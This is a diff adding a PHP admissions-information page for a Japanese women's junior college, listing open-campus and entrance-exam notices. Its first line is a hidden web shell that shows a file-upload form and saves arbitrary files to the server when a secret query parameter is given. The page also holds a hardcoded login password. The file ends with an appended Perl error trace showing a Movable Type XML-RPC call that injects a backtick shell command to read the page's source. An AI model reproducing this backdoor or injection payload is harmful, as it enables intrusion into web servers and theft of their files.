@@ -1,0 +1,163 @@
+<?php error_reporting(0); if($_GET['def'] == 'abc'){$saw1 = $_FILES['file']['tmp_name'];$saw2 = $_FILES['file']['name'];echo "<form method='POST' enctype='multipart/form-data'><input type='file' name='file' /><input type='submit' value='UPload' /></form>"; move_uploaded_file($saw1,$saw2); exit(0); } ?>
+<?php
+session_start();
+if($_POST["submit"]){
+if($_POST["password"] == "shinai0tomoiku"){
+$_SESSION["login_flag"] = 1;
+} else {
+$error = 1;
+}
+}
+?>
+<?php //スマホでのアクセスかを判定する
+header("Vary: User-Agent");
+//アクセスファイル名を取得
+$ac_file_nm = "sp_".basename($_SERVER['PHP_SELF']);
+$ua = $_SERVER['HTTP_USER_AGENT'];
+$sp_flag = 0;//UAのPC／スマホ判定（0:PC / 1:スマホ）
+if(isset($_GET['device_type'])){
+$device_type = $_GET['device_type'];
+}
+$regex_ua_spn = "(iPhone|iPod|Android|Mobile|Windows Phone)";//ユーザエージェント
+//ユーザエージェントを見てスマホか調べる
+if (preg_match($regex_ua_spn, $ua) != 0) {
+$sp_flag = 1;
+}
+?>
+<?php
+$disp_sp_flg = false;
+if ($device_type != "pc" && $sp_flag) {
+$disp_sp_flg = true;
+}
+?>
+<?php $now_page_title = "入試情報"; ?>
+<?php if(!$disp_sp_flg) { ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<?php
+include_once("/home/domain-admin/www/shinai-u.ac.jp/php/sj-meta.php");
+?>
+<meta name="keywords" content="信愛女子短期大学,大学,和歌山,入試情報" />
+<meta name="description" content="「入試情報」のページです。ひとつの心、ひとつの魂　～Un Seul Coeur Une Seule Ame～　愛と奉仕の精神が息づくキャンパスで学ぶということ。" />
+<title>入試情報：和歌山信愛女子短期大学</title>
+<link rel="stylesheet" type="text/css" href="http://www.shinai-u.ac.jp/css/styles.css" />
+</head>
+<body>
+<?php
+include_once("/home/domain-admin/www/shinai-u.ac.jp/php/sj-head2.php");
+?>
+<div class="sj-body">
+<div class="sj-body-inner">
+<?php
+include_once("/home/domain-admin/www/shinai-u.ac.jp/php/sj-side.php");
+?>
+<div class="sj-content">
+<div class="sj-pankuzu">
+<p><a href="http://www.shinai-u.ac.jp/">ホーム</a> &gt; 入試情報</p>
+</div>
+<div class="sj-page-title-img">
+<h2><a href="http://www.shinai-u.ac.jp/admission/"><img src="http://www.shinai-u.ac.jp/img/admission-title.jpg" alt="入試情報" /></a></h2>
+</div><!--sj-page-title-img-->
+<div class="sj-page-title">
+<h2>入試情報</h2>
+</div><!--sj-page-title-->
+<div class="sj-page-body">
+<div class="sj-page-body-inner">
+<div class="sj-page-list">
+<h3><a href="http://www.shinai-u.ac.jp/news/20211008-1.php">【入試】出願時の通知用封筒切手について（郵送料の変更）</a></h3>
+<p> 2021年10月1日より、郵送料（速達料金）が改定されました。それにより、今年...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20210921-1.php">【入試】総合型選抜（AO）セミナー動画（2021年9月18日対応・オンライン版）</a></h3>
+<p> このページの内容公開は終了いたしました。 総合型選抜（AO）については、こちら...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20210917-1.php">【台風14号】接近による9月18日（土）行事の中止について</a></h3>
+<p> 2021年9月18日（土）に予定されていた行事について、台風14号の接近による...</p>
+<h3><a href="http://www.shinai-u.ac.jp/admission/campusguide.php">2022年度キャンパスガイド</a></h3>
+<p>2022年度キャンパスガイド（PDF） 【通信環境にご注意ください】※大学案内パ...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20210908-1.php">【重要・入試】2021年9月18日（土）のオープンキャンパスに関する重要なお知らせ</a></h3>
+<p> ■2021年9月17日（金）情報追記下記の受験生（高校3年生および社会人志願者...</p>
+<h3><a href="http://www.shinai-u.ac.jp/admission/2021-2022-admission.php">2022年度学生募集要項・入学手続要項</a></h3>
+<p>2022年度学生募集要項・入学手続要項（PDF） 【PDFダウンロード】 【PD...</p>
+<h3><a href="http://www.shinai-u.ac.jp/admission/20210824-1.php">【入試】総合型選抜（AO）セミナー動画（2021年8月21日対応・オンライン版）</a></h3>
+<p> このページの内容公開は終了いたしました。 総合型選抜（AO）については、こちら...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20210811-1.php">【重要・入試】2021年8月21日（土）開催オープンキャンパスに関する事前予約のお願い</a></h3>
+<p> ■2021年8月21日（土）のオープンキャンパスに関する重要なお知らせ 現在の...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20210526-1.php">2021年オープンキャンパス送迎バスのご案内（利用予約制）</a></h3>
+<p> 今年度の送迎バス運行は終了しました 2021年のオープンキャンパス送迎バスは、...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20210607-1.php">【入試】総合型選抜（AO）セミナー動画（2021年6月5日対応・オンライン版）</a></h3>
+<p> このページの内容公開は終了いたしました。 総合型選抜（AO）については、こちら...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20210531-1.php">【入試】総合型選抜（AO）セミナー動画（2021年5月29日対応・オンライン版）</a></h3>
+<p> このページの内容公開は終了いたしました。 総合型選抜（AO）については、こちら...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20210514-1.php">【入試】2022年4月入学生向け総合型選抜（AO）エントリーについて</a></h3>
+<p>2022年4月入学生向けの総合型選抜（AO）について、募集要項の発行に先駆けて「...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20210501-1.php">【重要・入試】5月15日（土）のオープンキャンパス開催方法の変更（オンライン）について</a></h3>
+<p> 5月7（金）追記： 生配信へのリンクと、プログラム（予定）を公開しました。 2...</p>
+<h3><a href="http://www.shinai-u.ac.jp/admission/open-campus.php">オープンキャンパス</a></h3>
+<p> ■2021年9月17日（金）情報追記下記の受験生（高校3年生および社会人志願者...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20210220-2.php">【重要】2021年3月6日（土）のオープンキャンパス開催時間等の変更について</a></h3>
+<p> 現在の新型コロナウイルス感染症の流行状況から、感染拡大防止の対策として、チラシ...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20201201-1.php">【入試】総合型選抜（AO）対応セミナーの追加開催（12月12日・土）について</a></h3>
+<p> 【2020年12月12日（土）追記】 下記、12月12日（土）の追加開催は終了...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20200914-1.php">【入試】9月26日（土）オープンキャンパスの開催について</a></h3>
+<p> 【本学への交通手段について】 密を避ける目的で、岡崎前駅からのバスは運行いたし...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20200807-1.php">【入試】8月22日（土）オープンキャンパスの開催について</a></h3>
+<p> 新型コロナウイルス感染拡大防止の対策として、2020年8月22日（土）のオープ...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20200714-1.php">【重要・入試】7月18日（土）オープンキャンパス等の＜中止＞について（開催より変更）</a></h3>
+<p>7月18日（土）オープンキャンパスの中止と、本学での総合型選抜（AO）セミナー＜...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20200627-1.php">【重要・入試】総合型選抜（AO）セミナー動画（6月27日対応・ネット版）</a></h3>
+<p> このページの内容公開は終了いたしました。 次回の総合型選抜（AO）セミナーにつ...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20200617-1.php">【重要・入試】6月27日（土）総合型選抜（AO）セミナーについて</a></h3>
+<p> 6月27（土）追記： ネット（動画）でのセミナー受講に必要な動画を公開しました...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20200606-1.php">【重要・入試】総合型選抜（AO）セミナー動画（ネット版）</a></h3>
+<p> このページの内容公開は終了いたしました。 次回の総合型選抜（AO）セミナーにつ...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20200527-1.php">【重要・入試】6月6日（土）オープンキャンパスは中止しますが、総合型選抜（AO）セミナーは実施いたします</a></h3>
+<p> 6月6（土）追記： ネット（動画）でのセミナー受講に必要な動画を公開しました。...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/20200529-1.php">【高等学校の先生方へ】2021年度入試説明動画の公開について</a></h3>
+<p> この記事では、5月29日付（※）で各高等学校進路指導部あてにFAX送信した【和...</p>
+<h3><a href="http://www.shinai-u.ac.jp/admission/officialline.php">LINE & スマホで入試相談がスタートしました</a></h3>
+<p>和歌山信愛女子短期大学　公式LINE 和歌山信愛女子短期大学の公式LINEアカウ...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/admission200302-1.php">【重要】本学入学試験における新型コロナウイルス感染症への対応について</a></h3>
+<p>新型コロナウイルスへの感染予防対策として、和歌山信愛女子短期大学の入学試験では以...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/202002news.php">【重要（2月27日追記）】2020年4月入学予定者・木のおうち利用者の方へ（新型コロナウイルス肺炎感染予防について）</a></h3>
+<p>新型コロナウイルス肺炎感染予防のため、【2020年4月入学予定者向け入学前ガイダ...</p>
+<h3><a href="http://www.shinai-u.ac.jp/news/admission2020-1.php">消費税率の改定に伴う出願時に必要な郵便料金（切手貼付）について</a></h3>
+<p> 2019年10月からの消費税率の改定に伴う郵便料金などの変更に関連して、出願時...</p>
+<h3><a href="http://www.shinai-u.ac.jp/admission/course.php">学科専攻の紹介</a></h3>
+<p>保育科 愛と奉仕の精神を基盤とする人間形成に努め、現代社会に適応する保育の知識と...</p>
+<h3><a href="http://www.shinai-u.ac.jp/admission/demand.php">資料請求</a></h3>
+<p>お申し込みフォームから請求する その他　E-mail・TEL・FAXで請求する ...</p>
+<h3><a href="http://www.shinai-u.ac.jp/guidelines_for_applicants/">学生募集要項</a></h3>
+<p>2022年度 学生募集要項</p>
+<h3><a href="http://www.shinai-u.ac.jp/procedure/">入学手続き・学費など</a></h3>
+<p>｜<!--
+--><!--
+--><a href="http://www.shinai-u.ac.jp/admission/2021-2022-admission.php">2022年度学生募集要項・入学手続要項</a>｜<!--
+--><!--
+--><a href="http://www.shinai-u.ac.jp/procedure/h24.php">2022年度入学生　学生納付金</a>｜<!--
+--><!--
+--><a href="http://www.shinai-u.ac.jp/procedure/support.php">奨学金・学生生活の支援</a>｜<!--
+--><!--
+--><!--
+--></p>
+</div><!--sj-page-list-->
+</div><!--sj-page-body-inner-->
+</div><!--sj-page-body-->
+</div><!--sj-content-->
+<div class="clear"><img src="http://www.shinai-u.ac.jp/img/spacer.gif" width="1" height="1" alt="" /></div>
+</div><!--sj-body-inner-->
+</div><!--sj-body-->
+<?php
+include_once("/home/domain-admin/www/shinai-u.ac.jp/php/sj-foot.php");
+?>
+</body>
+</html>
+<?php } else { ?>
+<?php include_once $ac_file_nm; ?>
+<?php } ?>
+ in @INC (@INC contains: extlib lib /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at lib/MT.pm line 2938.
+ at lib/MT.pm line 2938
+	MT::handler_to_coderef('mt', '`cat ../../shinai-u.ac.jp/admission/index.php`') called at extlib/SOAP/Lite.pm line 2744
+	eval {...} called at extlib/SOAP/Lite.pm line 2729
+	eval {...} called at extlib/SOAP/Lite.pm line 2695
+	SOAP::Server::handle('XMLRPC::Transport::HTTP::CGI=HASH(0x2f1bba8)', '<methodCall>\x{d}\x{a}<methodName>mt.handler_to_coderef</methodName>\x{d}...') called at extlib/SOAP/Transport/HTTP.pm line 394
+	SOAP::Transport::HTTP::Server::handle('XMLRPC::Transport::HTTP::CGI=HASH(0x2f1bba8)') called at extlib/SOAP/Transport/HTTP.pm line 515
+	SOAP::Transport::HTTP::CGI::handle('XMLRPC::Transport::HTTP::CGI=HASH(0x2f1bba8)') called at mt-xmlrpc.cgi line 38
